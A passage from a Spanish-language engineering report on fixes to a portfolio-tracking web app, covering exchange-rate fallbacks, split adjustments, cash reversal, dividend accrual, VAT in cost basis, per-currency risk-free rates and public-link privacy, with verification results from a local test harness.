que casi nunca falte el tipo de cambio: `getCachedExchangeRate` intenta la
cotización viva, luego el par inverso ya cacheado, y por último el último tipo de
cambio conocido, guardado sin caducidad en `bp-fx-last-known-v1`. Un tipo de cambio
de ayer se equivoca por décimas; asumir 1:1 se equivoca por 18. Cuando no hay
ninguno de los tres, los agregados —tarjetas, KPIs, capital invertido, P/L
realizado, dividendos, compra y venta— **excluyen** la posición y lo dicen; las
celdas muestran `—` con el par que falta. El porcentaje de retorno por periodo sí
se conserva (se calcula dentro de una sola divisa); lo que se omite es el importe.

**3. Desempeño.** La serie diaria pasa a ponderarse por el VALOR de mercado de la
víspera y sólo entre posiciones tenidas en las DOS fechas del par. Con eso se
corrigen los dos defectos a la vez: se respeta la fecha de compra y los pesos
derivan con el precio. Mismo cambio en `computeHistoricalReport`, para que el
reporte y la app digan lo mismo. La beta agregada pasa a ponderar por valor de
mercado en vez de por costo.

**4. Splits.** Endpoint nuevo `GET /api/splits/{symbol}` (cacheado 6 h) y un aviso
sobre la lámina que lista cada activo con split posterior a la compra, con el
número exacto que resultaría (`12 → 48 acciones`). Se ofrece, no se aplica solo:
unos datos que ya vinieran ajustados —una importación de bróker— se romperían con
un ajuste automático. Al aceptar se ajustan la posición **y** las transacciones
anteriores al split (si sólo se tocara la posición, la primera edición de una
transacción la reconstruiría desde el historial crudo y desharía el ajuste);
`net` y `commCost` no se tocan, porque un split no mueve dinero. Es idempotente y
recuerda lo descartado. Además, las nueve series históricas que alimentan
retornos, correlaciones y gráficas pasan a pedir cierres **ajustados**; la única
que sigue cruda es la del par FX, que no reparte dividendos.

**5. Efectivo.** Cada transacción registra en `cashApplied` cuánto movió de verdad
la caja, con signo y en la divisa del portafolio. Editar o borrar revierte ese
importe exacto y vuelve a aplicar el nuevo con la misma regla que al crearlo. Antes
el piso en `Math.max(0, …)` hacía que borrar una compra de 2 000 que sólo había
consumido 700 devolviera 2 000. El saldo puede quedar negativo al revertir un
ingreso ya gastado, y se muestra como sobregiro en vez de esconderse en cero. El
dividendo registrado a mano ahora abona a la caja igual que el sincronizado —antes
no lo hacía, y su reversa restaba efectivo que nunca había entrado. Las
transacciones anteriores a este cambio no traen el campo y siguen usando el
cálculo de antes, así que nada de lo ya guardado se altera.

## Cómo se verificó

Arnés local sobre `main.html` con la autenticación y el backend de portafolios
sustituidos por dobles en memoria, manejando el Tracker real:

- El payload en el nombre y en el ticker no ejecuta nada, ni pintado en crudo.
- Un portafolio USD con una posición en MXN y sin par FX: valor $3 000 (excluye y
  avisa) en vez de $9 000. Con el tipo de cambio: $3 300. Y al caerse la
  cotización, sigue en $3 300 gracias a la memoria de último valor conocido.
- Multidivisa completo: invertido $4 329.87 y valor $7 802.00, cuadrados a mano.
- Comprar 300 con 1 000 en caja deja 700 y `cashApplied −300`; comprar 2 000 con
  700 deja 0 y `cashApplied −700`; borrar cada una devuelve exactamente lo que se
  llevó; borrar una venta cobrada y ya gastada deja −200.
- Split 4:1: 11 → 44 acciones, precio promedio 100 → 25, la compra histórica 10 →
  40 a 25 con `net` intacto en 1 000, e idempotente al segundo chequeo.
- Desempeño con una compra hecha el último día de la ventana sobre un activo que
  ya se había duplicado: **0 %**. La fórmula anterior, con esos mismos datos,
  devolvía **+66.67 %**.
- Las nueve pestañas del Tracker abren sin errores de JavaScript; el aviso de
  split y el de divisa se ven bien en claro y en oscuro, y a 375 px no desbordan
  (botones de 44 px).
- Backend: 94 pruebas en verde (89 previas + 5 nuevas).

## Encontrado al verificar, no corregido

`posTickerLogoHtml` (main.js) arma un `onerror` que hace `this.remove()` y después
`this.parentElement.textContent = …`; para entonces `parentElement` ya es `null`,
así que lanza y **las iniciales de respaldo nunca se pintan** cuando el logo no
carga. Es anterior a este trabajo y queda fuera del alcance P0.


---

# Qué se aplicó de los P1 (4 de septiembre de 2026)

Los nueve: hallazgos 6 a 14. Ninguno altera datos ya guardados sin que el usuario
lo pida, y ninguno rechaza un portafolio existente.

**6. Dividendos.** Función nueva `qtyHeldOnDate(portafolio, ticker, fecha)` que
reconstruye del historial la cantidad tenida en una fecha —transacciones más la
porción baseline de lo importado por CSV, que se cuenta desde su `purchaseDate`—.
La usan la sincronización automática y el registro manual, cuyo modal ahora dice
«AAPL · 10 acciones al 2025-03-01» y recalcula el total estimado al cambiar la
fecha de pago. Además la sincronización dejó de correr en **cada pintado** del
dashboard: corre una vez por portafolio y sesión (se rearma al agregar posiciones)
y sólo si el interruptor nuevo de Ajustes del portafolio, «Sincronizar dividendos
automáticamente», está activo — quien reinvierte (DRIP) o cobra en otra cuenta
puede apagarlo. Medido en el arnés con dos lotes de AAPL (10 en enero de 2025, 50
más en junio de 2026): los siete pagos se acreditan como 10, 10, 10, 10, 10, 10 y
60 acciones, **$58.30**. La fórmula anterior pagaba los siete sobre 60 —$109.80—
y, con la reescritura de fecha del hallazgo 7, hacía desaparecer los seis
primeros.

**7. "Comprar más".** Deja de reescribir el pasado. La fecha de compra se queda
con la **más antigua** de las dos (comprar 10 AAPL el 2026-09-01 sobre un lote de
enero de 2025 mantiene `2025-01-15`, así que el "vs Bench." y el "Retorno YTD" no
se reinician), un campo de fecha vacío ya no borra la que había, y el IVA se
pondera **por importe** en vez de sobreescribirse: comprar más sin marcar IVA
sobre una posición que sí lo pagó conserva los $0.60 exactos —tasa mezclada de
6.8571 % sobre la comisión total— en lugar de borrarlos. El emparejamiento por
ticker ahora compara la divisa antes de promediar: un lote en EUR contra una
posición en USD se rechaza con el motivo, en vez de promediarse 1:1.

**8. Una sola base de costo.** El IVA de la comisión entra a la transacción:
`net = bruto ± comisión ± IVA`, con `applyIva`/`ivaRate`/`ivaCost` guardados sólo
cuando hay IVA (una transacción sin él queda byte a byte como las ya guardadas).
`buildTxFromForm` conserva la **tasa** y recalcula el importe sobre la comisión
editada, en vez de copiar un IVA que ya no corresponde. Con eso el P/L realizado
—que se reconstruye del historial— y el efectivo abonado coinciden: una venta de
5 MSFT a 500 con 0.25 % de comisión e IVA del 16 % abona 2 492.75 a la caja y
graba `net` 2 492.75; antes grababa 2 493.75 y la ganancia realizada quedaba
sobreestimada exactamente en el peso de IVA de la comisión de venta. De paso, el
`portfolio.realizedPnL` que se acumulaba a mano en la venta pasa a derivarse de
`reconstructRealizedPnL`, que es lo único que leen los renders.

**9. Dividendos en el Retorno.** `sumDividendIncome()` suma los dividendos en la
divisa del portafolio —prefiriendo `cashApplied`, el importe exacto que entró a
la caja, sobre reconvertir hoy un pago de hace meses— y entra al Retorno total en
las tarjetas de la lista, en el dashboard y en el widget del hub. Se añadió el
KPI «Dividendos cobrados» y, bajo el registro, una **fila de conciliación**:
«Costo de posiciones con precio $19,004.35 + P/L no realizada $10,655.42 +
efectivo $5,058.30 = $34,718.07 de valor actual», con la cola «excluye N
posiciones sin precio o sin tipo de cambio» cuando la hay.

**10. Tasa libre de riesgo por divisa.** `/api/risk-free-rate` acepta
`?currency=`: MXN sigue siendo la TIIE 28 de Banxico —sin parámetro responde
exactamente lo de antes, así que un cliente viejo no cambia—, USD sale del
rendimiento del T-Bill a 13 semanas (`^IRX`, que Yahoo cotiza ya en porcentaje) y
EUR/GBP/CAD/JPY/CHF/AUD/BRL usan una referencia **declarada como tal** en la
etiqueta y sobreescribible por entorno (`RFR_EUR`, `RFR_GBP`, …) para corregirla
sin desplegar. El cliente pide la de la divisa del portafolio y la etiqueta lo
dice: «Tasa libre de riesgo: 3.76 % (USD · T-Bill 13 semanas (^IRX))». El reporte
histórico también la pide, en vez de usar el 9 % de respaldo cuando nunca se
abrió la pestaña de Desempeño. En el arnés, el mismo portafolio pasó de Sharpe
≈ 0.72 contra la TIIE a **1.00** contra la tasa correcta.

**11. Cambio de divisa.** El efectivo se **convierte** al tipo de cambio del
momento en vez de redenominarse, y con él los `cashApplied` de cada transacción
—que están en la divisa del portafolio y sin convertir habrían hecho que la
reversa devolviera pesos a una caja en dólares—. El modal avisa antes de guardar
(«Tu efectivo de $5,000.00 se convertirá a $84,495.00») y, si no hay tipo de
cambio y hay saldo, el cambio de moneda se rechaza con el motivo en vez de
convertir 5 000 dólares en 5 000 pesos.

**12. Unión de fechas.** La ventana de Desempeño pasa de la **intersección** a la
**unión**, con relleno hacia adelante por activo desde su primer cierre real: un
día sin dato propio conserva el último precio conocido —aporta 0 %, no un salto
inventado— y antes de existir queda fuera de la ponderación de ese día. Con
AAPL + MSFT + BTC-USD a un año, la ventana pasó de ~250 sesiones (sólo días
hábiles, porque la cripto cotiza en fin de semana) a **365**. Se añadió el aviso
«historia parcial: BTC-USD desde 2019-09-01» cuando a un activo le falta una
parte material de la ventana (≥ 5 % de las sesiones, o 5; menos que eso es el
ruido del arranque del rango, no una historia corta).

**13. Enlace público.** Por omisión ya **no se publica ningún importe**: la API
manda `relQty` —cantidad normalizada por la base de costo, de la que no se puede
despejar ni cantidad ni precio— para que la vista pública valore con precios en
vivo y saque pesos de mercado exactos, y `costWeight` como respaldo cuando algún
precio no llega. El KPI «Valor estimado» se sustituye por «Base: precio de
mercado / costo de compra» y la página lo dice: «Este enlace muestra
proporciones, no importes». El dueño puede activar «Incluir montos» desde el
modal de compartir; la preferencia vive **dentro del portafolio**
(`shareIncludeAmounts`), así que apagarla afecta al enlace ya repartido sin tener
que revocarlo. La copia del modal se corrigió para describir lo que hace.

**14. Tope de posiciones del plan.** `PLAN_LIMITS` del cliente gana
`maxPositions` (Explorer 10, Investor 50, ilimitado arriba, espejo del servidor)
y se valida **antes de mutar**, tanto al agregar una posición como al importar un
CSV («Tu CSV tiene 200 posiciones y tu plan permite 10»). Comprar más de un
ticker que ya tienes sigue permitido en el tope, igual que el
*grandfathering* del servidor.

## Cómo se verificó

Mismo arnés local que los P0 —`main.html` con la autenticación y el backend de
portafolios sustituidos por dobles en memoria—, manejando el Tracker real con
precios y dividendos vivos de Yahoo a través de la API local:

- Dividendos de AAPL: 10/10/10/10/10/10/60 acciones según la fecha ex; total
  $58.30 contra los $109.80 de la fórmula anterior.
- Comprar 10 AAPL el 2026-09-01: cantidad 70, promedio 200, fecha **2025-01-15**
  intacta. El mismo lote capturado en EUR se rechaza y no toca la posición.
- Comprar 5 MSFT sin marcar IVA sobre una posición con IVA: el IVA total sigue en
  **$0.60** (tasa mezclada 6.8571 %).
- Venta de MSFT con IVA: `net` = `cashApplied` = abono a la caja = 2 492.75; P/L
  realizado 738.075 en vez de 739.075.
- Desempeño: 365 sesiones (unión) y «3.76 % (USD · T-Bill 13 semanas (^IRX))»;
  en «Máx», el aviso de historia parcial de BTC-USD desde 2019-09-01.
- Cambio USD→MXN: 5 000 → 84 495 al 16.899, y los cuatro `cashApplied` escalados
  por el mismo factor.
- Vista pública en sus tres modos: pesos de mercado (AAPL 88.5 %) sin cifra de
  dinero, respaldo por costo cuando los precios no llegan, y «Valor estimado»
  sólo con el interruptor encendido.
- Tope de plan simulado a 3 posiciones: la cuarta no se crea y sale el aviso de
  mejora de plan; comprar más de una existente sí procede.
- Claro y oscuro, y 375 px sin desbordar la página.
- Backend: 97 pruebas en verde (94 previas + 3 nuevas de la vista pública).

## Encontrado al verificar, corregido

La columna «Último pago» de la pestaña Dividendos decía **«Invalid Date»**:
`tx.date` es un ISO completo y el render le concatenaba `"T12:00:00"`. Es
anterior a este trabajo, pero sólo se ve cuando hay dividendos registrados —que
es justo lo que arregla el hallazgo 6—, así que se corrigió aquí.
